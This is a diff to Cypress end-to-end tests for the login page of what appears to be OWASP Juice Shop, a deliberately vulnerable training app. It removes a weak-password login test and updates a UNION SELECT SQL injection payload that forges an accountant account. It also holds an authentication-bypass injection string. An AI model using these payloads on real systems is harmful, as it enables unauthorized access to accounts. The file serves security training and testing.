@@ -133,16 +133,6 @@ describe('/#/login', () => {
     })
   })
 
-  describe('challenge "oauthUserPasswordChallenge"', () => {
-    it('should be able to log in as bjoern.kimminich@gmail.com with base64-encoded email as password', () => {
-      cy.get('#email').type('bjoern.kimminich@gmail.com')
-      cy.get('#password').type('bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=')
-      cy.get('#loginButton').click()
-
-      cy.expectChallengeSolved({ challenge: 'Login Bjoern' })
-    })
-  })
-
   describe('challenge "ghostLoginChallenge"', () => {
     it('should be able to log in as chris.pike@juice-sh.op by using "\' or deletedAt IS NOT NULL --"', () => {
       cy.get('#email').type("' or deletedAt IS NOT NULL--")
@@ -165,7 +155,7 @@ describe('/#/login', () => {
   describe('challenge "ephemeralAccountant"', () => {
     it('should log in non-existing accountant user with SQLI attack on email field using UNION SELECT payload', () => {
       cy.get('#email').type(
-        "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--",
+        "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', 0 as 'isFederated', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--",
         { delay: 1 } // cypress defaults to 10ms delay between keystrokes, which here is nearly 5s of typing the payload...
       )
       cy.get('#password').type('a')
